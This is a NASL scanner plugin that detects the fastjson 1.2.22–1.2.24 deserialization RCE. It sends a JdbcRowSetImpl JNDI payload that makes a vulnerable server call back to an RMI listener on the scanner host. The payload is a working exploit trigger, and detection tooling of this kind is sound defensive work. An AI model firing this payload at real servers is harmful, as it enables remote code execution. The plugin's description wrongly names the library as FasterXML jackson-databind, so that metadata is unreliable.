include("compat.inc");


if (description)
{
  script_id(51799253);
  script_version("1.3");
  script_name(english:"fastjson 1.2.22-1.2.24 RCE");
  script_summary(english:"fastjson 1.2.22-1.2.24 RCE");
  script_set_attribute(attribute:"description", value:"FasterXML jackson-databind 1.2.22 -1.2.24 mishandles the interaction between serialization gadgets and typing, related tocom.sun.rowset.JdbcRowSetImpl.");
  script_set_attribute(attribute:"solution", value:"At present, the manufacturer has released an upgrade patch to fix the vulnerability, and the patch acquisition link:https://github.com/FasterXML/");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www", 80, 8080);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");
include("install_func.inc");
include("dump.inc");

############################################
function check_local_ping(port){
	var bind_result = bind_sock_tcp();
	if (isnull(bind_result))audit(AUDIT_SOCK_FAIL, port);
	var bind_sock = bind_result[0];
	var bind_port = bind_result[1];
	laddress = compat::this_host();
	
    i = 0;
	argv[i++] = "iptables";        
	#argv[i++] = "-I";
	#argv[i++] = "INPUT";
	#argv[i++] = "-p";
	#argv[i++] = "tcp";
	#argv[i++] = "--dport";
	#argv[i++] = bind_port;
	#argv[i++] = "-j";
	#argv[i++] = "ACCEPT";
	#pread(cmd: "iptables", argv: argv, nice: 5);
	var postdata = '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://'+ laddress +':'+ bind_port +'/Exploit","autoCommit":true}}';

	uri = "/";
    fast_send = http_send_recv3(method: "POST", port: port, item: uri,content_type:'application/json',data:postdata,fetch404: TRUE);
	var accept_sock = sock_accept(socket:bind_sock, timeout:10);
	j = 0;
	argv[j++] = "iptables";        
	#argv[j++] = "-D";
	#argv[j++] = "INPUT";
	#argv[j++] = "-p";
	#argv[j++] = "tcp";
	#argv[j++] = "--dport";
	#argv[j++] = bind_port;
	#argv[j++] = "-j";
	#argv[j++] = "ACCEPT";
    #pread(cmd: "iptables", argv: argv, nice: 5);
    if(!accept_sock) exit(0);
	var curl_response = recv(socket:accept_sock, length:7);
    if ("JRMI" >< curl_response && "K" >< curl_response){
	    return {'vuln':true, 'report':"fastjson< 1.2.24 JNDI RCE"};
	} 

}

####################
#begin here
####################
port = get_kb_item("Services/www");
if(isnull(port)) exit(0);
result_l = check_local_ping(port:port);
if (result_l['vuln']){
	security_hole(port:port, extra:result_l['report']);
	exit(0);
}

exit(0);
